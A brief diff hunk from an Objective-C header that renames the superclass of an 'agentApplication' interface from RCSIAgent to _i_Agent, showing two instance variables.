@@ -10,7 +10,7 @@
 
 #import "RCSIAgent.h"
 
-@interface agentApplication : RCSIAgent
+@interface agentApplication : _i_Agent
 {
   BOOL      isAppStarted;
   NSString *mProcessName;
